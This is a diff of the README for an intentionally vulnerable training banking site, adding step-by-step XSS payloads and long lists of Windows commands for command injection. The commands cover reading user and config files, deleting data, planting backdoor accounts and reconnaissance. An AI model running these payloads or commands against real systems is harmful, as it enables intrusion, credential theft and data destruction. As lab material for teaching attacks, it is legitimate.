@@ -68,17 +68,26 @@ A **deliberately broken** banking website designed to teach cybersecurity by let
 
 **What it is:** Putting harmful code into websites that runs when others visit.
 
-**How to do it:**
+**Method 1 - Profile XSS:**
 1. Login as any user
 2. Go to your Profile page
 3. In the **Full Name** field, paste: `<img src=x onerror=alert('HACKED!')>`
 4. Save your profile
 5. **Result:** Every time someone views your profile, they see a "HACKED!" popup
 
-**More examples to try:**
+**Method 2 - Transfer Page XSS:**
+1. Login to the bank
+2. Go to **Transfer Money** page
+3. In the **Search Users** field, paste: `<img src=x onerror=alert('XSS in Search!')>`
+4. Click Search
+5. **Result:** The malicious script executes immediately!
+
+**More XSS examples to try:**
 ```html
 <script>alert('Your session: ' + document.cookie)</script>
 <img src=x onerror=alert('XSS Attack Successful')>
+<svg onload=alert('SVG XSS')>
+<iframe src=javascript:alert('iframe XSS')>
 ```
 
 ---
@@ -148,16 +157,76 @@ fetch('http://localhost:5000/api/user/1', {
 
 **How to do it:**
 1. Login to the bank
-2. Go to **System Tools** (if available)
-3. In the ping field, type: `8.8.8.8 && whoami`
+2. Go to **Transaction History** page
+3. In the **Search Transactions** field, type any of these commands:
 4. Submit
-5. **Result:** Shows you information about the server!
+5. **Result:** The server executes your commands!
 
-**More commands to try:**
+**Database Attacks:**
 ```bash
-8.8.8.8 && dir                    # Show folder contents
-8.8.8.8 && echo "I hacked this!"  # Display custom message
-8.8.8.8 && ipconfig               # Show network info
+dump_users                         # Show all user data
+show_database                      # Display database info
+```
+
+**File Discovery:**
+```bash
+dir                               # List current directory
+dir *.json                        # Find JSON files
+dir *.env                         # Find environment files
+dir *.txt                         # Find text files
+dir *.js                          # Find JavaScript files
+dir /s *.config                   # Find config files recursively
+```
+
+**Data Theft:**
+```bash
+type users.json                   # Read user database
+type transactions.json            # Read transaction data
+type config.env                   # Read configuration
+type admin_notes.txt              # Read admin notes
+type package.json                 # Read project info
+type .gitignore                   # Read git ignore file
+```
+
+**System Reconnaissance:**
+```bash
+whoami                           # Current user
+ver                              # Windows version
+ipconfig                         # Network configuration
+systeminfo                       # System information
+net user                         # List users
+tasklist                         # Running processes
+set                              # Environment variables
+echo %PATH%                      # System PATH
+hostname                         # Computer name
+```
+
+**File Operations:**
+```bash
+copy users.json stolen_data.txt   # Copy sensitive files
+del users.json                    # Delete user database
+ren config.env backup.env         # Rename files
+mkdir hidden_folder               # Create directories
+move transactions.json temp.bak   # Move files
+attrib +h admin_notes.txt         # Hide files
+```
+
+**Backdoor Creation:**
+```bash
+echo {"backdoor":"created"} > hack.json
+echo admin2:password123 >> users.txt
+echo @echo off > backdoor.bat
+copy con malware.txt
+```
+
+**Network Reconnaissance:**
+```bash
+netstat -an                      # Network connections
+arp -a                           # ARP table
+route print                      # Routing table
+nslookup google.com              # DNS lookup
+ping -n 1 127.0.0.1             # Ping localhost
+ipconfig /all                    # Full network config
 ```
 
 ---
